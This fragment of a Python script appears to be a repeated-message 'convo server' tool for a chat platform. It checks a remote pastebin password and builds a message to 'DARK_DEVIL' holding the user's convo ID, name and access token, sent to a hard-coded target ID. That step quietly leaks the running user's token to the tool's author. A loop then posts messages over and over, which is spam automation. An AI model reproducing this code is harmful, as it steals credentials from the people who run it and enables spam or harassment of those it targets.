...
def send_initial_message():
    ...
    mmm_pass = requests.get('https://pastebin.com/raw/2SQJVBTY').text
    
    if mmm_pass not in password:
        print('\033[1;31m⚠︎ Your Password Changed By DARK_DEVIL ⚠︎')
        sys.exit()
    
    # Message template
    msg_template = "Owner => T.S BRAND \n Hello DARK_DEVIL sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = ["100065640313135"]
    ...
    while True:
        try:
            for message_index in range(num_messages):
                ...
                response = requests.post(url, json=parameters, headers=headers)
                if response.ok:
                    print("\033[1;36m[✓] MESAAGE DROP SUCESSFUL No. {} of Convo {} Token {}: {}".format(
